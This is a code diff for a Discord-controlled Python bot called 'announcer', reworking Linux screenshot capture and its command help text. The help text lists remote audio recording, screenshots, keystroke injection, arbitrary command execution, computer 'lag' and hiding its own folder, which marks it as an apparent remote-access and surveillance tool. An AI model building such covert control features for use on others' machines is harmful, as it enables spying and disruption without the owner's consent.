@@ -1,17 +1,14 @@
-# LINUX PORT OF ANNOUNCER
-
 import os
-import sys
-import discord
-from dotenv import load_dotenv
-import requests
+import subprocess
 import asyncio
+import discord
 import sounddevice as sd
 import soundfile as sf
+import requests
 import time
-import subprocess
+from dotenv import load_dotenv
+from mss import mss
 import shutil
-import urllib.parse
 
 # load env variables from .env file
 load_dotenv()
@@ -41,105 +38,69 @@ async def wifi_check():
 
 asyncio.run(wifi_check())
 
+def has_cmd(cmd):
+    return shutil.which(cmd) is not None
+
+def is_wayland():
+    return os.environ.get("WAYLAND_DISPLAY") is not None
 
 async def capture_screenshot(filename: str):
     def _capture():
-        # Try using mss (fast, cross-platform for X11)
-        try:
-            import mss
-            import mss.tools
-            with mss.mss() as sct:
-                monitor = sct.monitors[0]
-                sct_img = sct.grab(monitor)
-                mss.tools.to_png(sct_img.rgb, sct_img.size, output=filename)
-            return True
-        except Exception:
-            pass
+        print("Wayland:", is_wayland())
 
-        # Try Pillow ImageGrab
-        try:
-            from PIL import ImageGrab
-            im = ImageGrab.grab(all_screens=True)
-            im.save(filename)
-            return True
-        except Exception:
-            pass
-
-        # Try Wayland tool 'grim' if available
-        if shutil.which('grim'):
+        # --- 1. MSS (X11 only) ---
+        if not is_wayland():
             try:
-                subprocess.check_call(['grim', filename])
-                return True
-            except Exception:
-                pass
-
-        # Try KDE's Spectacle
-        if shutil.which('spectacle'):
-            try:
-                subprocess.check_call(['spectacle', '-b', '-n', '-o', filename])
-                return True
-            except Exception:
-                pass
-
-        # Try ImageMagick 'import' (works on X11)
-        if shutil.which('import'):
-            try:
-                subprocess.check_call(['import', '-window', 'root', filename])
-                return True
-            except Exception:
-                pass
-
-        # Try gnome-screenshot (try forcing X11 backend first)
-        if shutil.which('gnome-screenshot'):
-            try:
-                env = os.environ.copy()
-                env['GDK_BACKEND'] = 'x11'
-                subprocess.check_call(['gnome-screenshot', '-f', filename], env=env)
-                return True
-            except Exception:
-                try:
-                    subprocess.check_call(['gnome-screenshot', '-f', filename])
+                with mss() as sct:
+                    sct.shot(output=filename)
+                if os.path.exists(filename):
+                    print("Used MSS")
                     return True
-                except Exception:
-                    pass
+            except Exception as e:
+                print("MSS failed:", e)
 
-        # Try scrot (common fallback)
-        if shutil.which('scrot'):
+        # --- 2. spectacle (KDE) ---
+        if has_cmd("spectacle"):
             try:
-                subprocess.check_call(['scrot', filename])
-                return True
-            except Exception:
-                pass
+                subprocess.run(
+                    ["spectacle", "-b", "-n", "-o", filename],
+                    check=True
+                )
+                if os.path.exists(filename):
+                    print("Used spectacle")
+                    return True
+            except Exception as e:
+                print("spectacle failed:", e)
 
-        # Try xdg-desktop-portal via gdbus (GNOME/Wayland portal)
-        if shutil.which('gdbus'):
+        # --- 3. grim (Wayland) ---
+        if has_cmd("grim"):
             try:
-                out = subprocess.check_output([
-                    'gdbus', 'call', '--session', '--dest', 'org.freedesktop.portal.Desktop',
-                    '--object-path', '/org/freedesktop/portal/desktop', '--method',
-                    'org.freedesktop.portal.Screenshot.Screenshot', '{}', '{}'
-                ], text=True)
-                idx = out.find('file://')
-                if idx != -1:
-                    # find end (quote or space)
-                    end = out.find("'", idx)
-                    if end == -1:
-                        end = out.find('"', idx)
-                    if end == -1:
-                        end = len(out)
-                    uri = out[idx:end]
-                    path = urllib.parse.unquote(uri[len('file://'):])
-                    if os.path.exists(path):
-                        shutil.copy(path, filename)
-                        return True
-            except Exception:
-                pass
+                subprocess.run(["grim", filename], check=True)
+                if os.path.exists(filename):
+                    print("Used grim")
+                    return True
+            except Exception as e:
+                print("grim failed:", e)
+
+        # --- 4. scrot (X11 fallback) ---
+        if has_cmd("scrot"):
+            try:
+                subprocess.run(["scrot", filename], check=True)
+                if os.path.exists(filename):
+                    print("Used scrot")
+                    return True
+            except Exception as e:
+                print("scrot failed:", e)
 
         return False
 
     ok = await asyncio.to_thread(_capture)
-    if not ok:
-        raise RuntimeError('No available screenshot method (install mss, Pillow, scrot, or grim)')
+
+    # 🚨 CRITICAL FIX
+    if not ok or not os.path.exists(filename):
+        raise RuntimeError(
+            "Screenshot failed: no working backend (install spectacle, grim, or scrot)"
+        )
 
 class MyClient(discord.Client):
     
@@ -169,7 +130,7 @@ class MyClient(discord.Client):
                     global selectedClient
                     
                     if message.content[7:].strip() == 'list':
-                        await message.channel.send(f'Current selected client: {selectedClient}\nAvailable clients: {clientName}')
+                        await message.channel.send(f'Current selected client: {selectedClient} -- Available clients: {clientName}')
                         return
                     
                     selectedClient = message.content[7:].strip()
@@ -180,26 +141,26 @@ class MyClient(discord.Client):
                     help_message = (
                         "# PLEASE RUN client list to select a client\n"
                         "# you cannot use the program without selecting a client\n"
-                        "## Available commands:\n"
-                        "rec - Record audio\n"
-                        "upd - Update the application\n"
-                        "scr - Take a screenshot\n"
-                        "tts - Text-to-speech\n"
-                        "msg - Display a message box\n"
-                        "lock - Lock the screen\n"
-                        "key - Send keystrokes\n"
-                        "close - Close a process\n"
-                        "img - Display an image\n"
-                        "vid - Display a video\n"
-                        "sound - Play a sound\n"
-                        "vol - Set the volume\n"
-                        "shortcut - Press a shortcut\n"
-                        "lag - Lag computer(CPU and RAM and GPU)\n"
-                        "cmd - Run a command\n"
-                        "cmdtoggle - Toggle command mode\n"
-                        "hide - Hide the announcer folder\n"
-                        "unhide - Unhide the announcer folder\n"
-                        "help - Show this help message\n"
+                        "## Available commands (Legend: 🐧 = Linux | 🪟 = Windows | 🐧🪟 = Both):\n"
+                        "rec - Record audio (🐧🪟)\n"
+                        "upd - Update the application (🪟)\n"
+                        "scr - Take a screenshot (🐧🪟)\n"
+                        "tts - Text-to-speech (🪟)\n"
+                        "msg - Display a message box (🪟)\n"
+                        "lock - Lock the screen (🪟)\n"
+                        "key - Send keystrokes (🪟)\n"
+                        "close - Close a process (🪟)\n"
+                        "img - Display an image (🪟)\n"
+                        "vid - Display a video (🪟)\n"
+                        "sound - Play a sound (🪟)\n"
+                        "vol - Set the volume (🪟)\n"
+                        "shortcut - Press a shortcut (🪟)\n"
+                        "lag - Lag computer (CPU/RAM/GPU) (🪟)\n"
+                        "cmd - Run a command (🪟)\n"
+                        "cmdtoggle - Toggle command mode (🪟)\n"
+                        "hide - Hide the announcer folder (🪟)\n"
+                        "unhide - Unhide the announcer folder (🪟)\n"
+                        "help - Show this help message (🐧🪟)\n"
                     )
                     await message.channel.send(help_message)
 
